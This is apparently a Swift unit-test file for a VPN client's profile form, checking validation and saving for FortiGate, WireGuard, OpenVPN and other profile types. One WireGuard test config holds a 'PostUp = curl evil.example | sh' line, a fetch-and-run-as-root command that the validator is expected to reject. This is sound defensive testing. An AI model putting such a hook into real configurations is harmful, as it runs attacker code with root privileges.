import Foundation
import Testing
@testable import PeonyCore

/// The add and edit form's rules: what it asks for, what it explains, and what Save writes.
struct ProfileDraftTests {
  static let id = UUID(uuidString: "00000000-0000-0000-0000-0000000000AA")!
  static let wireGuardConfig = "[Interface]\nPrivateKey = abc\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = def\nEndpoint = vpn.example.com:51820\n"

  @Test func `a new form asks for every required field at once`() {
    let draft = ProfileDraft()
    #expect(draft.problems == [.name: "Required.", .server: "Required.", .username: "Required.", .password: "Required."])
    #expect(draft.saved(id: Self.id) == nil)
  }

  @Test func `a filled-in FortiGate saves trimmed, with its password for the Keychain`() {
    var draft = ProfileDraft()
    draft.name = "  Office "
    draft.forti.host = " vpn.example.com "
    draft.fortiUsername = "alex"
    draft.secret = "hunter2"
    draft.hosts = "git.example.com, 10.0.0.5:22\nwiki.example.com"
    #expect(draft.problems.isEmpty)
    let saved = draft.saved(id: Self.id)
    #expect(saved?.profile == Profile(
      id: Self.id, name: "Office", kind: .forti(.init(host: "vpn.example.com", login: .password(username: "alex"))),
      destinations: ["git.example.com", "10.0.0.5:22", "wiki.example.com"]))
    #expect(saved?.secret == "hunter2")
    #expect(saved?.openVPNPassword == nil)
  }

  @Test func `a malformed value says what it should look like`() {
    var draft = ProfileDraft()
    draft.name = "Office"
    draft.forti.host = "vpn example com"
    draft.forti.port = 0
    draft.fortiUsername = "alex\nadmin"
    draft.secret = "pw"
    draft.forti.trustedCert = "abc"
    draft.hosts = "git.example.com, :22"
    #expect(draft.problems == [
      .server: "Server should be a hostname or IP address, like vpn.example.com.",
      .port: "Port must be between 1 and 65535.",
      .username: "Username can't contain line breaks or control characters.",
      .trustedCert: "Trusted certificate should be a 64-character SHA-256 fingerprint.",
      .hosts: "“:22” isn't a host or host:port.",
    ])
  }

  @Test func `browser sign-in needs no username or password, and saves no secret`() {
    var draft = ProfileDraft()
    draft.name = "SSO"
    draft.forti.host = "vpn.example.com"
    draft.fortiLogin = .browser
    draft.secret = "left over"
    let saved = draft.saved(id: Self.id)
    #expect(saved?.profile.kind == .forti(.init(host: "vpn.example.com", login: .browser)))
    #expect(saved?.secret == nil)
  }

  @Test func `an existing VPN keeps its saved password when the field stays empty`() {
    let profile = Profile(id: Self.id, name: "Campus", kind: .openConnect(.init(server: "vpn.campus.edu", username: "alex")))
    let draft = ProfileDraft(profile, hasSavedSecret: true)
    #expect(draft.problems.isEmpty)
    #expect(draft.saved(id: Self.id) == ProfileDraft.Saved(profile: profile, secret: nil, openVPNPassword: nil))

    let unsaved = ProfileDraft(profile, hasSavedSecret: false)
    #expect(unsaved.problems == [.password: "Required."])
  }

  @Test(arguments: [
    Profile(name: "Office", kind: .forti(.init(host: "vpn.example.com", port: 8443, login: .password(username: "alex"), trustedCert: String(repeating: "a", count: 64), realm: "staff"))),
    Profile(name: "SSO", kind: .forti(.init(host: "vpn.example.com", login: .browser))),
    Profile(name: "Campus", kind: .openConnect(.init(server: "vpn.campus.edu", serverProtocol: .gp, username: "alex"))),
    Profile(name: "Home", kind: .wireGuard(.init(interfaceName: "home0"))),
    Profile(name: "Lab", kind: .openVPN(.init(username: "", server: "vpn.lab.example"))),
    Profile(name: "Mesh", kind: .netBird(.init(managementURL: "https://netbird.example.com"))),
    Profile(name: "Tail", kind: .tailscale, destinations: ["nas.home:445"]),
  ])
  func `an untouched draft of a saved VPN saves it unchanged`(profile: Profile) {
    let draft = ProfileDraft(profile, hasSavedSecret: true)
    #expect(draft == ProfileDraft(profile, hasSavedSecret: true))
    #expect(draft.saved(id: profile.id) == ProfileDraft.Saved(profile: profile, secret: nil, openVPNPassword: nil))

    var edited = draft
    edited.name += " 2"
    #expect(edited != draft)
  }

  @Test func `a config is checked as it's typed, and an empty one is required only when none is saved`() {
    var draft = ProfileDraft()
    draft.name = "Home"
    draft.type = .wireGuard
    #expect(draft.problems == [.config: "Required."])

    draft.secret = "[Interface]\nPrivateKey = abc\nPostUp = curl evil.example | sh\n[Peer]\nPublicKey = def\n"
    #expect(draft.problems == [.config: "Line 3 uses PostUp, which runs shell commands as root. Peony doesn't allow it; remove the line."])

    draft.secret = Self.wireGuardConfig
    draft.wireGuard.interfaceName = "Home VPN"
    #expect(draft.problems == [.interface: "Interface should be 1–15 lowercase letters, digits, - or _, starting with a letter."])

    draft.wireGuard.interfaceName = "home0"
    #expect(draft.saved(id: Self.id)?.secret == Self.wireGuardConfig)

    let saved = ProfileDraft(Profile(name: "Home", kind: .wireGuard(.init())), hasSavedSecret: true)
    #expect(saved.problems.isEmpty)
  }

  @Test func `an OpenVPN password is needed only with a username`() {
    var draft = ProfileDraft()
    draft.name = "Lab"
    draft.type = .openVPN
    draft.secret = "client\r\nremote vpn.lab.example 1194\r\n"
    #expect(draft.problems.isEmpty)
    #expect(draft.saved(id: Self.id)?.profile.kind == .openVPN(.init(username: "", server: "vpn.lab.example")))

    draft.openVPN.username = "alex"
    #expect(draft.problems == [.password: "Required."])
    draft.openVPNPassword = "pw"
    #expect(draft.saved(id: Self.id)?.openVPNPassword == "pw")
  }

  @Test func `switching kinds clears the secret, so a password never shows as a config`() {
    var draft = ProfileDraft()
    draft.secret = "hunter2"
    draft.type = .forti
    #expect(draft.secret == "hunter2")
    draft.type = .wireGuard
    #expect(draft.secret.isEmpty)
  }

  @Test func `only kinds with optional pins and realms have advanced values`() {
    var draft = ProfileDraft()
    #expect(!draft.hasAdvancedValues)
    draft.forti.realm = "staff"
    #expect(draft.hasAdvancedValues)
    draft.type = .tailscale
    #expect(!draft.hasAdvancedValues)
  }
}
